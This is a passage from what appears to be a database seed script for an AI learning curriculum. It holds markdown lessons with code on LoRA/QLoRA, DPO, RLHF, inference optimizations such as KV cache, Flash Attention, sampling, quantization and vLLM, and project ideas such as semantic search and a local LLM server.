dataset = load_dataset("tatsu-lab/alpaca", split="train[:1000]")
texts = [f"Instruction: {x['instruction']}\\nResponse: {x['output']}" for x in dataset]
\`\`\`

## Training Loop
\`\`\`python
from torch.utils.data import DataLoader

# Tokenize
def tokenize(text):
    return tokenizer(text, truncation=True, max_length=256, padding="max_length", return_tensors="pt")

# Create dataloader
train_data = [tokenize(t) for t in texts]

# Training
optimizer = torch.optim.AdamW(
    [p for p in model.parameters() if p.requires_grad],
    lr=1e-4
)

model.train()
for epoch in range(3):
    for batch in train_data:
        input_ids = batch['input_ids'].to(device)
        attention_mask = batch['attention_mask'].to(device)

        outputs = model(input_ids, attention_mask=attention_mask, labels=input_ids)
        loss = outputs.loss

        loss.backward()
        optimizer.step()
        optimizer.zero_grad()

        print(f"Loss: {loss.item():.4f}")
\`\`\`

## Compare to Full Fine-tuning
\`\`\`python
# Metric: Memory usage
# Full fine-tuning: ~6GB for GPT-2
# LoRA: ~2GB for GPT-2

# Metric: Training speed
# Similar or slightly faster with LoRA

# Metric: Quality
# For most tasks, LoRA matches full fine-tuning
\`\`\`

## Completion Criteria
- [ ] Applied LoRA to GPT-2
- [ ] Fine-tuned on custom data
- [ ] Verified memory savings
- [ ] Generated samples from fine-tuned model`],

	['Study QLoRA paper',
	'Learn how QLoRA enables fine-tuning 65B models on consumer GPUs.',
	`## Paper
"QLoRA: Efficient Finetuning of Quantized LLMs"
https://arxiv.org/abs/2305.14314

## The Problem
- Llama 65B needs ~130GB in FP16
- Even LoRA needs full model in memory for forward pass
- Can't fit on consumer GPUs (24GB-48GB)

## The Solution: QLoRA
Combine three techniques:

### 1. 4-bit NormalFloat Quantization
\`\`\`
FP16 (2 bytes) → NF4 (0.5 bytes) = 4x memory reduction

NF4 = values optimized for normal distribution
Better than uniform 4-bit for neural net weights
\`\`\`

### 2. Double Quantization
\`\`\`
Quantization needs scale factors (one per block of weights)
These scales also use memory!

Double quantization: quantize the quantization constants
Saves ~0.5GB on 65B model
\`\`\`

### 3. Paged Optimizers
\`\`\`
Optimizer states can spike memory during backward pass
Paged optimizers: offload to CPU, page back in when needed
Prevents OOM during training
\`\`\`

## Result
| Model | Full FT | LoRA | QLoRA |
|-------|---------|------|-------|
| 7B    | 28GB    | 14GB | 6GB   |
| 13B   | 52GB    | 26GB | 10GB  |
| 65B   | 260GB   | 130GB| 48GB  |

## Using QLoRA
\`\`\`python
from transformers import BitsAndBytesConfig
from peft import get_peft_model, LoraConfig

# Quantization config
bnb_config = BitsAndBytesConfig(
    load_in_4bit=True,
    bnb_4bit_quant_type="nf4",
    bnb_4bit_compute_dtype=torch.float16,
    bnb_4bit_use_double_quant=True,
)

# Load quantized model
model = AutoModelForCausalLM.from_pretrained(
    "meta-llama/Llama-2-7b-hf",
    quantization_config=bnb_config,
    device_map="auto",
)

# Add LoRA
peft_config = LoraConfig(
    r=16,
    lora_alpha=32,
    target_modules=["q_proj", "v_proj"],
)
model = get_peft_model(model, peft_config)
\`\`\`

## Completion Criteria
- [ ] Understand the three techniques
- [ ] Know memory requirements for different model sizes
- [ ] Can set up QLoRA with bitsandbytes`],

	['Read DPO paper',
	'Study Direct Preference Optimization as a simpler alternative to RLHF.',
	`## Paper
"Direct Preference Optimization: Your Language Model is Secretly a Reward Model"
https://arxiv.org/abs/2305.18290

## The Problem with RLHF
Traditional RLHF has 3 stages:
1. SFT (Supervised Fine-Tuning)
2. Train reward model
3. PPO optimization

Complex, unstable, lots of hyperparameters.

## DPO's Insight
Skip the reward model! Directly optimize preferences.

Given: (prompt, chosen_response, rejected_response) pairs

## The DPO Loss
\`\`\`python
# The key equation
loss = -log(sigmoid(β * (
    log_prob_chosen - log_prob_rejected -
    ref_log_prob_chosen + ref_log_prob_rejected
)))
\`\`\`

Where:
- log_prob_chosen: Model's log probability of chosen response
- log_prob_rejected: Model's log probability of rejected response
- ref_log_prob_*: Reference model's (frozen) log probabilities
- β: Controls strength (typically 0.1-0.5)

## Intuition
- Push model to prefer chosen over rejected
- KL penalty (via reference model) keeps it from going too far
- No reward model needed!

## Implementation Sketch
\`\`\`python
def dpo_loss(model, ref_model, prompts, chosen, rejected, beta=0.1):
    # Get log probs from current model
    chosen_logprobs = get_logprobs(model, prompts, chosen)
    rejected_logprobs = get_logprobs(model, prompts, rejected)

    # Get log probs from reference model (frozen)
    with torch.no_grad():
        ref_chosen_logprobs = get_logprobs(ref_model, prompts, chosen)
        ref_rejected_logprobs = get_logprobs(ref_model, prompts, rejected)

    # DPO loss
    logits = beta * (
        (chosen_logprobs - rejected_logprobs) -
        (ref_chosen_logprobs - ref_rejected_logprobs)
    )
    loss = -F.logsigmoid(logits).mean()
    return loss
\`\`\`

## Comparison to RLHF
| Aspect | RLHF | DPO |
|--------|------|-----|
| Stages | 3 | 1 |
| Reward model | Yes | No |
| Stability | Tricky | Stable |
| Performance | Good | Similar |

## Completion Criteria
- [ ] Understand the DPO objective
- [ ] Know the role of the reference model
- [ ] Can explain why it's simpler than RLHF`],

	['Understand RLHF pipeline',
	'Learn the complete Reinforcement Learning from Human Feedback pipeline.',
	`## The Full RLHF Pipeline

### Stage 1: Supervised Fine-Tuning (SFT)
\`\`\`
Base Model → Fine-tune on demonstrations → SFT Model
\`\`\`

Train on high-quality examples of desired behavior.
This creates the foundation for alignment.

### Stage 2: Reward Model Training
\`\`\`
Collect preferences: (prompt, response_A, response_B, human_choice)
Train classifier: "Which response is better?"
\`\`\`

\`\`\`python
# Reward model predicts scalar reward
reward_chosen = reward_model(prompt + chosen)
reward_rejected = reward_model(prompt + rejected)

# Bradley-Terry loss
loss = -log(sigmoid(reward_chosen - reward_rejected))
\`\`\`

### Stage 3: PPO Optimization
\`\`\`
Generate response from current policy
Get reward from reward model
Update policy to maximize reward
But: KL penalty to stay close to SFT model!
\`\`\`

\`\`\`python
# Simplified PPO objective
reward = reward_model(prompt + response)
kl_penalty = kl_divergence(policy, ref_policy)
objective = reward - beta * kl_penalty
\`\`\`

## Why the KL Penalty?
Without it, the model can:
- Find reward model exploits (gaming)
- Produce degenerate outputs that score high
- Lose its language modeling abilities

The KL penalty says: "Improve, but don't stray too far from the original."

## Diagram
\`\`\`
                    ┌─────────────────┐
                    │ Human Feedback  │
                    │ (preferences)   │
                    └────────┬────────┘
                             │
                             ▼
┌──────────┐    ┌────────────────────┐    ┌──────────────┐
│ Base LLM │───▶│ SFT (Stage 1)      │───▶│ SFT Model    │
└──────────┘    └────────────────────┘    └──────┬───────┘
                                                  │
                         ┌────────────────────────┼────────────────────────┐
                         │                        │                        │
                         ▼                        ▼                        ▼
               ┌─────────────────┐    ┌───────────────────┐    ┌──────────────────┐
               │ Reward Model    │    │ Reference Model   │    │ Policy Model     │
               │ (Stage 2)       │    │ (frozen SFT)      │    │ (being trained)  │
               └────────┬────────┘    └─────────┬─────────┘    └────────┬─────────┘
                        │                       │                       │
                        └───────────────────────┼───────────────────────┘
                                                │
                                                ▼
                                    ┌───────────────────┐
                                    │ PPO (Stage 3)     │
                                    │ Maximize: reward  │
                                    │ - β * KL(π, ref)  │
                                    └───────────────────┘
\`\`\`

## Key Papers
- **InstructGPT** (OpenAI): Original RLHF paper
- **Constitutional AI** (Anthropic): RLAIF with AI feedback
- **LLaMA 2** (Meta): Open-source RLHF details

## Completion Criteria
- [ ] Understand all 3 stages
- [ ] Know why KL penalty is essential
- [ ] Can explain reward hacking problem`]
];

trainingTasks.forEach(([title, desc, details], i) => {
	insertTask.run(aiMod3.lastInsertRowid, title, desc, details, i, now);
});

// Phase 4: Inference & Optimization
const aiMod4 = insertModule.run(
	aiPath.lastInsertRowid,
	'Phase 4: Inference & Optimization',
	'Optimize models for production deployment',
	4,
	now
);

const inferenceTasks: [string, string, string][] = [
	['Implement KV cache',
	'Add key-value caching to speed up autoregressive generation.',
	`## The Problem
Without cache, each new token regenerates K and V for ALL previous tokens:
- Token 1: compute K,V for 1 token
- Token 2: compute K,V for 2 tokens (1 was already computed!)
- Token 100: compute K,V for 100 tokens (99 were already computed!)

This is O(n²) compute for n tokens.

## The Solution: KV Cache
Cache K and V from previous tokens. Only compute for the new token.

## Implementation
\`\`\`python
class CausalSelfAttention(nn.Module):
    def forward(self, x, past_kv=None):
        B, T, C = x.size()

        # Compute Q, K, V for current tokens
        q = self.W_q(x)
        k = self.W_k(x)
        v = self.W_v(x)

        # Concatenate with cache
        if past_kv is not None:
            past_k, past_v = past_kv
            k = torch.cat([past_k, k], dim=1)
            v = torch.cat([past_v, v], dim=1)

        # Return new cache along with output
        new_kv = (k, v)

        # Attention computation uses full K, V
        # but Q is only for new tokens
        attn = (q @ k.transpose(-2, -1)) / math.sqrt(self.d_k)
        # ... rest of attention ...

        return output, new_kv
\`\`\`

## Memory Requirement
\`\`\`
cache_size = batch * layers * 2 * seq_len * d_head
           = 1 * 32 * 2 * 2048 * 128
           = 16MB per sequence for 7B model
\`\`\`

## Speedup
- Without cache: O(n²) compute for n tokens
- With cache: O(n) compute for n tokens
- Speedup: 10-100x for typical sequence lengths

## Completion Criteria
- [ ] Implemented KV caching in attention
- [ ] Generation uses cache correctly
- [ ] Measured speedup vs no cache`],

	['Study Flash Attention',
	'Understand the memory-efficient attention algorithm used in production.',
	`## Paper
https://arxiv.org/abs/2205.14135

## The Problem
Standard attention materializes the full N×N attention matrix:
\`\`\`
Memory: O(N²) for sequence length N
For N=8192: 256MB just for attention scores!
\`\`\`

## The Solution: Flash Attention
Never materialize the full matrix. Compute in tiles.

## How It Works

### Standard Attention
\`\`\`python
# O(N²) memory
scores = Q @ K.T / sqrt(d_k)  # N×N matrix
weights = softmax(scores)     # N×N matrix
output = weights @ V          # Use N×N matrix
\`\`\`

### Flash Attention (Simplified)
\`\`\`python
# O(N) memory
for q_block in Q.blocks():
    for kv_block in (K, V).blocks():
        # Compute partial attention in SRAM
        partial_scores = q_block @ kv_block.T
        # Update running softmax (online algorithm)
        update_softmax_state(partial_scores)
# Never materialize full N×N matrix
\`\`\`

## Key Insight
Softmax can be computed incrementally:
\`\`\`
softmax([a, b, c]) can be computed as:
1. Process a
2. Update with b
3. Update with c
Without ever storing all three at once
\`\`\`

## Why It's Faster
- GPU memory hierarchy: SRAM (fast) < HBM (slow)
- Standard: many HBM accesses for N×N matrix
- Flash: computation in SRAM, fewer HBM accesses
- IO-aware algorithm design

## Using Flash Attention
\`\`\`python
# PyTorch 2.0+ (automatic)
F.scaled_dot_product_attention(Q, K, V)  # Uses Flash if available

# Explicit
from flash_attn import flash_attn_func
output = flash_attn_func(Q, K, V, causal=True)
\`\`\`

## Completion Criteria
- [ ] Understand why standard attention is O(N²) memory
- [ ] Know the tiling strategy conceptually
- [ ] Can use Flash Attention in PyTorch`],

	['Implement top-k and top-p sampling',
	'Build sampling strategies for controlling generation diversity.',
	`## Greedy vs Sampling
- **Greedy:** Always pick highest probability token (deterministic, boring)
- **Sampling:** Sample from distribution (diverse, but can be nonsensical)

## Temperature
Scale logits before softmax:
\`\`\`python
probs = softmax(logits / temperature)
# T < 1: More peaked (confident)
# T = 1: Original distribution
# T > 1: More uniform (random)
\`\`\`

## Top-K Sampling
Keep only the k highest probability tokens:
\`\`\`python
def top_k_sample(logits, k):
    # Get top k values and indices
    values, indices = torch.topk(logits, k)

    # Zero out everything else
    logits_filtered = torch.full_like(logits, float('-inf'))
    logits_filtered.scatter_(1, indices, values)

    # Sample from filtered distribution
    probs = F.softmax(logits_filtered, dim=-1)
    return torch.multinomial(probs, num_samples=1)
\`\`\`

## Top-P (Nucleus) Sampling
Keep smallest set of tokens with cumulative probability ≥ p:
\`\`\`python
def top_p_sample(logits, p):
    # Sort by probability
    sorted_logits, sorted_indices = torch.sort(logits, descending=True)
    probs = F.softmax(sorted_logits, dim=-1)

    # Find cutoff
    cumsum = torch.cumsum(probs, dim=-1)
    mask = cumsum <= p
    # Keep at least one token
    mask[..., 0] = True

    # Filter
    sorted_logits[~mask] = float('-inf')

    # Unsort and sample
    logits_filtered = sorted_logits.gather(-1, sorted_indices.argsort(-1))
    probs = F.softmax(logits_filtered, dim=-1)
    return torch.multinomial(probs, num_samples=1)
\`\`\`

## Combined (Common in Practice)
\`\`\`python
def sample(logits, temperature=1.0, top_k=50, top_p=0.9):
    logits = logits / temperature

    # Apply top-k
    if top_k > 0:
        values, _ = torch.topk(logits, top_k)
        logits[logits < values[..., -1:]] = float('-inf')

    # Apply top-p
    if top_p < 1.0:
        sorted_logits, sorted_indices = torch.sort(logits, descending=True)
        cumsum = F.softmax(sorted_logits, dim=-1).cumsum(-1)
        mask = cumsum > top_p
        mask[..., 1:] = mask[..., :-1].clone()
        mask[..., 0] = False
        sorted_logits[mask] = float('-inf')
        logits = sorted_logits.gather(-1, sorted_indices.argsort(-1))

    probs = F.softmax(logits, dim=-1)
    return torch.multinomial(probs, num_samples=1)
\`\`\`

## Completion Criteria
- [ ] Implemented top-k sampling
- [ ] Implemented top-p sampling
- [ ] Tested with different parameters`],

	['Study speculative decoding',
	'Learn how to speed up generation using a smaller draft model.',
	`## Paper
https://arxiv.org/abs/2211.17192

## The Problem
Large models are slow to generate:
- Each token requires full forward pass
- GPU is underutilized (small batch during generation)

## The Idea
Use a small "draft" model to guess multiple tokens, then verify with the large model in one forward pass.

## How It Works
\`\`\`
1. Draft model generates k tokens quickly
2. Large model evaluates all k tokens in ONE forward pass
3. Accept tokens where draft matches large model
4. On mismatch: reject token and resample from large model
\`\`\`

## The Math (Rejection Sampling)
Accept draft token with probability:
\`\`\`
accept_prob = min(1, p_large(token) / p_draft(token))
\`\`\`

This guarantees output distribution matches the large model exactly!

## Example Trace
\`\`\`
Prompt: "The capital of France is"

Draft model (fast): "Paris, which is also"  (5 tokens)
Large model verifies:
  - "Paris" ✓ accept
  - "," ✓ accept
  - "which" ✓ accept
  - "is" ✗ reject (large model prefers "a")
  - Resample: "a"

Output: "Paris, which a"

Benefit: Generated 4 tokens with just 1 large model forward pass!
\`\`\`

## When It Works Well
- Draft model matches large model's distribution
- k is tuned right (typically 4-8)
- Large model is bottleneck (not memory)

## Typical Speedups
| Setup | Speedup |
|-------|---------|
| 7B draft for 70B | 2-3x |
| Same model with quantization | 1.5-2x |

## Completion Criteria
- [ ] Understand the draft-verify paradigm
- [ ] Know why rejection sampling preserves distribution
- [ ] Understand when speculative decoding helps`],

	['Learn quantization basics',
	'Understand how to reduce model precision for faster inference.',
	`## What is Quantization?
Reduce precision: FP32 → FP16 → INT8 → INT4

\`\`\`
FP32: 32 bits per weight = 4 bytes
FP16: 16 bits per weight = 2 bytes
INT8: 8 bits per weight = 1 byte
INT4: 4 bits per weight = 0.5 bytes
\`\`\`

## Linear Quantization
\`\`\`python
# Quantize
scale = (max_val - min_val) / (2**bits - 1)
zero_point = round(-min_val / scale)
x_quant = round(x / scale + zero_point)

# Dequantize
x_approx = (x_quant - zero_point) * scale
\`\`\`

## Symmetric vs Asymmetric
\`\`\`
Symmetric: zero_point = 0, range is [-max, max]
Asymmetric: zero_point != 0, range is [min, max]
\`\`\`

Symmetric is simpler, asymmetric handles skewed distributions.

## Per-Tensor vs Per-Channel
\`\`\`
Per-tensor: one scale for entire tensor
Per-channel: one scale per output channel (more accurate)
\`\`\`

## Calibration
Find optimal scale/zero_point from sample data:
\`\`\`python
# Run sample inputs through model
for batch in calibration_data:
    model(batch)  # Record min/max activations

# Use recorded stats to determine quantization parameters
\`\`\`

## Memory Savings
| Model | FP16 | INT8 | INT4 |
|-------|------|------|------|
| 7B    | 14GB | 7GB  | 3.5GB|
| 13B   | 26GB | 13GB | 6.5GB|
| 70B   | 140GB| 70GB | 35GB |

## Speed Improvements
- INT8: ~2x faster on supported hardware
- INT4: ~4x faster (but quality degrades)

## Completion Criteria
- [ ] Understand quantize/dequantize operations
- [ ] Know symmetric vs asymmetric tradeoffs
- [ ] Know memory savings for different precisions`],

	['Study GPTQ/AWQ quantization',
	'Learn state-of-the-art 4-bit quantization methods for LLMs.',
	`## GPTQ
"Accurate Post-Training Quantization for Generative Pretrained Transformers"

### Key Idea
Use second-order information (Hessian) to minimize quantization error.

### How It Works
\`\`\`
For each layer:
1. Compute Hessian: H = X^T X (input activations)
2. Quantize weights one column at a time
3. Distribute quantization error to remaining columns
4. Use Hessian to minimize total output error
\`\`\`

### Result
- 4-bit weights with minimal quality loss
- Activations remain FP16
- Very fast inference

## AWQ
"Activation-aware Weight Quantization"

### Key Idea
Not all weights are equally important. Protect the important ones.

### How It Works
\`\`\`
1. Run calibration data
2. Find weights that affect activations most
3. Scale up important weights BEFORE quantization
4. Scale down activations correspondingly

Important weights get more precision in quantized form.
\`\`\`

## Comparison
| Method | Perplexity (7B) | Speed |
|--------|-----------------|-------|
| FP16   | 5.68            | 1x    |
| GPTQ   | 5.85            | 3x    |
| AWQ    | 5.78            | 3x    |

## Using GPTQ
\`\`\`python
from auto_gptq import AutoGPTQForCausalLM

model = AutoGPTQForCausalLM.from_quantized(
    "TheBloke/Llama-2-7b-GPTQ",
    use_safetensors=True,
    device="cuda:0"
)
\`\`\`

## Using AWQ
\`\`\`python
from awq import AutoAWQForCausalLM

model = AutoAWQForCausalLM.from_quantized(
    "TheBloke/Llama-2-7b-AWQ",
    fuse_layers=True
)
\`\`\`

## Completion Criteria
- [ ] Understand GPTQ's Hessian-based approach
- [ ] Understand AWQ's activation-aware scaling
- [ ] Loaded and used a quantized model`],

	['Try vLLM for serving',
	'Deploy a model with vLLM for high-throughput inference.',
	`## What is vLLM?
High-throughput LLM serving engine with:
- PagedAttention (efficient KV cache)
- Continuous batching
- Optimized CUDA kernels

## Installation
\`\`\`bash
pip install vllm
\`\`\`

## Basic Usage
\`\`\`python
from vllm import LLM, SamplingParams

# Load model
llm = LLM(model="meta-llama/Llama-2-7b-hf")

# Set sampling parameters
sampling_params = SamplingParams(
    temperature=0.8,
    top_p=0.95,
    max_tokens=256
)

# Generate
prompts = ["Hello, my name is", "The president of the US is"]
outputs = llm.generate(prompts, sampling_params)

for output in outputs:
    print(output.outputs[0].text)
\`\`\`

## Server Mode
\`\`\`bash
# Start server
python -m vllm.entrypoints.openai.api_server \\
    --model meta-llama/Llama-2-7b-hf \\
    --port 8000

# Query like OpenAI API
curl http://localhost:8000/v1/completions \\
    -H "Content-Type: application/json" \\
    -d '{"model": "meta-llama/Llama-2-7b-hf", "prompt": "Hello", "max_tokens": 100}'
\`\`\`

## Benchmark
\`\`\`python
import time

# vLLM
start = time.time()
outputs = llm.generate(prompts * 100, sampling_params)
vllm_time = time.time() - start

# Compare to HuggingFace
from transformers import AutoModelForCausalLM, AutoTokenizer
model = AutoModelForCausalLM.from_pretrained("meta-llama/Llama-2-7b-hf")
start = time.time()
for prompt in prompts * 100:
    model.generate(tokenizer(prompt, return_tensors="pt").input_ids)
hf_time = time.time() - start

print(f"vLLM: {vllm_time:.1f}s")
print(f"HuggingFace: {hf_time:.1f}s")
print(f"Speedup: {hf_time/vllm_time:.1f}x")
\`\`\`

Expected speedup: 5-20x depending on workload.

## Key Features
- **PagedAttention:** KV cache stored in pages, like virtual memory
- **Continuous batching:** New requests added without waiting
- **Quantization support:** GPTQ, AWQ, INT8

## Completion Criteria
- [ ] Installed and ran vLLM
- [ ] Benchmarked against HuggingFace
- [ ] Started OpenAI-compatible server`],

	['Implement continuous batching',
	'Build a batching system that maximizes GPU utilization.',
	`## The Problem with Static Batching
\`\`\`
Request 1: "Hello" → generates 50 tokens
Request 2: "Hi" → generates 10 tokens
Request 3: "Hey" → generates 100 tokens

Static batch: wait for all 3 to finish (100 tokens)
GPU sits idle while request 1,2 are "done" but waiting.
\`\`\`

## Continuous Batching
As soon as a request finishes, add a new one:
\`\`\`
Step 1: [req1, req2, req3] all generating
Step 10: req2 finishes → immediately add req4
Step 50: req1 finishes → immediately add req5
Step 100: req3 finishes → immediately add req6
\`\`\`

GPU is always fully utilized!

## Implementation Sketch
\`\`\`python
class ContinuousBatcher:
    def __init__(self, model, max_batch_size):
        self.model = model
        self.max_batch_size = max_batch_size
        self.active_requests = []
        self.pending_queue = []

    def add_request(self, prompt):
        self.pending_queue.append(Request(prompt))

    def step(self):
        # Fill batch from pending queue
        while len(self.active_requests) < self.max_batch_size:
            if not self.pending_queue:
                break
            self.active_requests.append(self.pending_queue.pop(0))

        if not self.active_requests:
            return

        # Prepare batched inputs
        input_ids = self.prepare_batch()

        # Forward pass
        logits = self.model(input_ids)

        # Sample next tokens
        next_tokens = self.sample(logits)

        # Update each request
        completed = []
        for i, req in enumerate(self.active_requests):
            req.generated_tokens.append(next_tokens[i])

            # Check if done
            if req.is_complete():
                completed.append(req)

        # Remove completed requests
        for req in completed:
            self.active_requests.remove(req)
            req.callback(req.get_output())

    def run(self):
        while self.active_requests or self.pending_queue:
            self.step()
\`\`\`

## Key Challenges
1. **Variable length sequences:** Pad to max length in batch
2. **KV cache management:** Each request has different cache sizes
3. **Efficient memory:** PagedAttention helps here

## Throughput Improvement
| Batching | Throughput (tok/s) |
|----------|-------------------|
| No batching | 30 |
| Static (batch=8) | 150 |
| Continuous | 400+ |

## Completion Criteria
- [ ] Understand static vs continuous batching
- [ ] Implemented basic continuous batcher
- [ ] Requests complete independently`]
];

inferenceTasks.forEach(([title, desc, details], i) => {
	insertTask.run(aiMod4.lastInsertRowid, title, desc, details, i, now);
});

// Phase 5: Projects
const aiMod5 = insertModule.run(
	aiPath.lastInsertRowid,
	'Phase 5: Build Projects',
	'Apply knowledge to real projects',
	5,
	now
);

const projectTasks: [string, string, string][] = [
	['Build character-level text generator',
	'Train your GPT implementation on custom data and generate creative text.',
	`## Choose Your Data Source
- **Your own writing:** Blogs, notes, messages
- **Books:** Project Gutenberg has free classics
- **Code:** Your GitHub repos
- **Lyrics:** Songs from your favorite artist
- **Domain text:** Legal docs, medical papers, recipes

## Data Preparation
\`\`\`python
import os

# Collect all text files
texts = []
for file in os.listdir('data/'):
    with open(f'data/{file}') as f:
        texts.append(f.read())

# Concatenate
full_text = '\\n'.join(texts)

# Create train/val split
n = len(full_text)
train_data = full_text[:int(n*0.9)]
val_data = full_text[int(n*0.9):]

# Save
with open('train.txt', 'w') as f: f.write(train_data)
with open('val.txt', 'w') as f: f.write(val_data)
\`\`\`

## Training
\`\`\`python
# Using your GPT implementation or nanoGPT
python train.py \\
    --data_dir=data/ \\
    --n_layer=6 \\
    --n_head=6 \\
    --n_embd=384 \\
    --max_iters=5000 \\
    --eval_interval=500
\`\`\`

## Generation Experiments
\`\`\`python
# Try different temperatures
for temp in [0.5, 0.8, 1.0, 1.2]:
    print(f"\\n=== Temperature {temp} ===")
    sample = model.generate(start, temperature=temp, max_tokens=200)
    print(sample)
\`\`\`

## Success Criteria
- Model captures vocabulary of your domain
- Generated text is stylistically similar
- Can complete prompts in your domain

## Completion Criteria
- [ ] Collected and prepared custom data
- [ ] Trained for 5k+ iterations
- [ ] Generated samples at different temperatures
- [ ] Model captures domain style`],

	['Create domain-specific fine-tuned model',
	'Fine-tune a model to be an expert in your chosen domain.',
	`## Choose Your Domain
Pick something you know well:
- A programming language (Rust, Go, etc.)
- A game you play (strategies, lore)
- Your profession (law, medicine, finance)
- A hobby (cooking, music, etc.)

## Collect Data
\`\`\`python
# Example: Programming Q&A
data = [
    {
        "instruction": "How do I read a file in Rust?",
        "output": "Use std::fs::read_to_string..."
    },
    {
        "instruction": "Explain ownership in Rust",
        "output": "Ownership is Rust's memory management..."
    }
]
\`\`\`

Sources:
- Stack Overflow (filter by tag)
- Official documentation
- Your own notes and examples
- Wiki/FAQ pages

## Format as Instruction-Response
\`\`\`python
def format_for_training(item):
    return f"""### Instruction:
{item['instruction']}

### Response:
{item['output']}"""
\`\`\`

## Fine-tune with LoRA
\`\`\`python
from peft import get_peft_model, LoraConfig
from transformers import AutoModelForCausalLM

# Use a small base model
model = AutoModelForCausalLM.from_pretrained("TinyLlama/TinyLlama-1.1B")

# Apply LoRA
peft_config = LoraConfig(r=16, lora_alpha=32, target_modules=["q_proj", "v_proj"])
model = get_peft_model(model, peft_config)

# Train on your data
trainer = Trainer(model=model, train_dataset=dataset, ...)
trainer.train()
\`\`\`

## Evaluate
Test questions the base model gets wrong:
\`\`\`python
test_questions = [
    "What's the difference between Box and Rc in Rust?",
    "How do I use lifetimes with structs?",
]

for q in test_questions:
    print(f"Base model: {base_model.generate(q)}")
    print(f"Fine-tuned: {finetuned_model.generate(q)}")
\`\`\`

## Completion Criteria
- [ ] Collected 100+ domain-specific examples
- [ ] Fine-tuned with LoRA
- [ ] Model answers domain questions better than base`],

	['Build semantic search engine',
	'Create a search system that finds documents by meaning, not keywords.',
	`## Overview
Traditional search: keyword matching
Semantic search: meaning matching

"How do I fix a memory leak?" matches "debugging RAM issues"

## Step 1: Setup Embeddings
\`\`\`python
from sentence_transformers import SentenceTransformer

# Load embedding model
model = SentenceTransformer('all-MiniLM-L6-v2')

# Test
embedding = model.encode("Hello world")
print(embedding.shape)  # (384,)
\`\`\`

## Step 2: Index Your Documents
\`\`\`python
import numpy as np
import pickle

# Your documents
documents = [
    "How to set up a Python virtual environment",
    "Debugging memory leaks in C++",
    "Introduction to machine learning",
    # ... more documents
]

# Embed all documents
embeddings = model.encode(documents)
print(embeddings.shape)  # (n_docs, 384)

# Save for later
np.save('embeddings.npy', embeddings)
with open('documents.pkl', 'wb') as f:
    pickle.dump(documents, f)
\`\`\`

## Step 3: Search Function
\`\`\`python
def search(query, top_k=5):
    # Embed query
    query_embedding = model.encode(query)

    # Compute similarities
    similarities = embeddings @ query_embedding

    # Get top k
    top_indices = np.argsort(similarities)[-top_k:][::-1]

    results = []
    for idx in top_indices:
        results.append({
            'document': documents[idx],
            'score': similarities[idx]
        })
    return results
\`\`\`

## Step 4: Scale with FAISS
\`\`\`python
import faiss

# Create index
dimension = embeddings.shape[1]
index = faiss.IndexFlatIP(dimension)  # Inner product

# Add embeddings
index.add(embeddings.astype('float32'))

# Search
query_embedding = model.encode(query).astype('float32').reshape(1, -1)
scores, indices = index.search(query_embedding, top_k)
\`\`\`

## Step 5: Build UI
\`\`\`python
import gradio as gr

def search_ui(query):
    results = search(query, top_k=5)
    return "\\n\\n".join([f"{r['score']:.3f}: {r['document']}" for r in results])

gr.Interface(fn=search_ui, inputs="text", outputs="text").launch()
\`\`\`

## Completion Criteria
- [ ] Embedded 100+ documents
- [ ] Search returns semantically similar results
- [ ] Built simple UI for querying`],

	['Implement recommendation system',
	'Build a system that recommends items based on user preferences.',
	`## Choose Your Dataset
- **MovieLens:** Movie ratings (classic ML dataset)
- **Your data:** GitHub stars, Spotify history, bookmarks

## Approach 1: Collaborative Filtering
"Users who liked X also liked Y"

\`\`\`python
import numpy as np
from sklearn.decomposition import TruncatedSVD

# User-item matrix (ratings)
# Rows: users, Columns: items
R = np.array([
    [5, 3, 0, 1],  # User 0
    [4, 0, 0, 1],  # User 1
    [1, 1, 0, 5],  # User 2
    [0, 0, 5, 4],  # User 3
])

# Matrix factorization
svd = TruncatedSVD(n_components=2)
user_factors = svd.fit_transform(R)
item_factors = svd.components_.T

# Predict ratings
predicted = user_factors @ item_factors.T

# Recommend: highest predicted ratings for unrated items
def recommend(user_id, n=3):
    user_ratings = R[user_id]
    predictions = predicted[user_id]

    # Only consider unrated items
    unrated = user_ratings == 0
    candidates = np.where(unrated)[0]

    # Sort by predicted rating
    top = sorted(candidates, key=lambda i: predictions[i], reverse=True)
    return top[:n]
\`\`\`

## Approach 2: Content-Based
"Items similar to what you liked"

\`\`\`python
from sentence_transformers import SentenceTransformer

# Embed item descriptions
model = SentenceTransformer('all-MiniLM-L6-v2')
item_embeddings = model.encode(item_descriptions)

def content_recommend(liked_items, n=5):
    # Average embedding of liked items
    liked_embedding = item_embeddings[liked_items].mean(axis=0)

    # Find similar items
    similarities = item_embeddings @ liked_embedding
    similarities[liked_items] = -1  # Exclude already liked

    top = np.argsort(similarities)[-n:][::-1]
    return top
\`\`\`

## Approach 3: Hybrid
Combine both signals:
\`\`\`python
def hybrid_recommend(user_id, liked_items, alpha=0.5):
    collab_scores = collaborative_scores(user_id)
    content_scores = content_scores(liked_items)

    combined = alpha * collab_scores + (1-alpha) * content_scores
    return np.argsort(combined)[-10:][::-1]
\`\`\`

## Evaluate
\`\`\`python
# Hold out some ratings
train_ratings, test_ratings = split_ratings(R)

# Train on train_ratings
# Predict on test_ratings
# Measure RMSE
\`\`\`

## Completion Criteria
- [ ] Implemented collaborative filtering
- [ ] Implemented content-based filtering
- [ ] Evaluated on held-out data`],

	['Build local LLM inference server',
	'Create a REST API for serving a quantized LLM locally.',
	`## Architecture
\`\`\`
Client → FastAPI → llama.cpp (or vLLM) → Response
\`\`\`

## Option 1: llama.cpp Backend
\`\`\`bash
# Install
pip install llama-cpp-python

# Download quantized model
wget https://huggingface.co/.../llama-2-7b.Q4_K_M.gguf
\`\`\`

## FastAPI Server
\`\`\`python
from fastapi import FastAPI
from fastapi.responses import StreamingResponse
from llama_cpp import Llama
from pydantic import BaseModel

app = FastAPI()

# Load model once at startup
llm = Llama(
    model_path="llama-2-7b.Q4_K_M.gguf",
    n_ctx=2048,
    n_gpu_layers=35,  # Offload to GPU
)

class GenerateRequest(BaseModel):
    prompt: str
    max_tokens: int = 256
    temperature: float = 0.8
    stream: bool = False

@app.post("/generate")
async def generate(request: GenerateRequest):
    if request.stream:
        return StreamingResponse(
            stream_response(request),
            media_type="text/event-stream"
        )

    output = llm(
        request.prompt,
        max_tokens=request.max_tokens,
        temperature=request.temperature,
    )
    return {"text": output["choices"][0]["text"]}

async def stream_response(request):
    for chunk in llm(
        request.prompt,
        max_tokens=request.max_tokens,
        temperature=request.temperature,
        stream=True,
    ):
        text = chunk["choices"][0]["text"]
        yield f"data: {text}\\n\\n"
\`\`\`

## Add Embeddings Endpoint
